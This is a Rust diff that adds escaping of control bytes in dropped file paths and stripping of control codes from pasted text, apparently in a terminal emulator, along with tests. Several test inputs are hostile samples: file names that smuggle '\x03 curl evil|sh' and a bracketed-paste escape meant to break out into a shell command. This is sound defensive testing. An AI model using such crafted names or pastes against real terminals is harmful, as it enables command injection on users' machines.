@@ -55,9 +55,29 @@ pub enum Dropped {
     Text(String, (f32, f32)),
 }
 
+const fn is_control(byte: u8) -> bool {
+    byte < 0x20 || byte == 0x7f
+}
+
+fn ansi_c_quote(bytes: &[u8]) -> Vec<u8> {
+    let mut quoted = b"$'".to_vec();
+    for &byte in bytes {
+        match byte {
+            b'\\' | b'\'' => quoted.extend_from_slice(&[b'\\', byte]),
+            _ if is_control(byte) => quoted.extend_from_slice(format!("\\x{byte:02x}").as_bytes()),
+            _ => quoted.push(byte),
+        }
+    }
+    quoted.push(b'\'');
+    quoted
+}
+
 #[must_use]
 pub fn quote(path: &std::path::Path) -> String {
     let text = path.to_string_lossy();
+    if text.bytes().any(is_control) {
+        return String::from_utf8_lossy(&ansi_c_quote(text.as_bytes())).into_owned();
+    }
     let plain = |c: char| c.is_alphanumeric() || "/._-+,:@%~=".contains(c);
     if !text.is_empty() && text.chars().all(plain) {
         return text.into_owned();
@@ -66,10 +86,31 @@ pub fn quote(path: &std::path::Path) -> String {
 }
 
 #[must_use]
+pub(crate) fn without_controls(text: &[u8]) -> Vec<u8> {
+    let mut kept = Vec::with_capacity(text.len());
+    let mut index = 0;
+    while let Some(&byte) = text.get(index) {
+        let c1 = byte == 0xc2 && text.get(index + 1).is_some_and(|next| (0x80..=0x9f).contains(next));
+        if c1 {
+            index += 2;
+            continue;
+        }
+        if !is_control(byte) || matches!(byte, b'\t' | b'\n' | b'\r') {
+            kept.push(byte);
+        }
+        index += 1;
+    }
+    kept
+}
+
+#[must_use]
 pub(crate) fn quote_bytes(path: &std::path::Path) -> Vec<u8> {
     use std::os::unix::ffi::OsStrExt;
     if path.to_str().is_some() {
         return quote(path).into_bytes();
+    }
+    if path.as_os_str().as_bytes().iter().copied().any(is_control) {
+        return ansi_c_quote(path.as_os_str().as_bytes());
     }
     let mut quoted = vec![b'\''];
     for &byte in path.as_os_str().as_bytes() {
@@ -318,6 +359,28 @@ mod tests {
         use std::os::unix::ffi::OsStrExt;
         let path = std::path::Path::new(std::ffi::OsStr::from_bytes(b"/tmp/a\xff'b"));
         assert_eq!(quote_bytes(path), b"'/tmp/a\xff'\\''b'");
+    }
+
+    #[test]
+    fn a_file_name_with_control_bytes_cannot_interrupt_the_line_it_is_dropped_into() {
+        use std::os::unix::ffi::OsStrExt;
+        let hostile = Path::new("/tmp/x\x03 curl evil|sh\ry");
+        let quoted = quote(hostile);
+        assert_eq!(quoted, r"$'/tmp/x\x03 curl evil|sh\x0dy'");
+        assert!(!quoted.bytes().any(is_control));
+        let raw = Path::new(std::ffi::OsStr::from_bytes(b"/tmp/a\xff\x1b[201~'\\"));
+        let quoted = quote_bytes(raw);
+        assert_eq!(quoted, b"$'/tmp/a\xff\\x1b[201~\\'\\\\'");
+        assert!(!quoted.iter().copied().any(is_control));
+    }
+
+    #[test]
+    fn pasted_text_keeps_tabs_and_newlines_but_loses_other_control_codes() {
+        assert_eq!(without_controls(b"ls\t-la\r\nexit\n"), b"ls\t-la\r\nexit\n");
+        assert_eq!(without_controls(b"echo hi\x03 curl evil|sh\r"), b"echo hi curl evil|sh\r");
+        assert_eq!(without_controls(b"\x1b[201~rm\x7f\x04\x1a"), b"[201~rm");
+        assert_eq!(without_controls("a\u{9b}b\u{85}c".as_bytes()), b"abc");
+        assert_eq!(without_controls("ще ✓ €".as_bytes()), "ще ✓ €".as_bytes());
     }
 
     #[test]
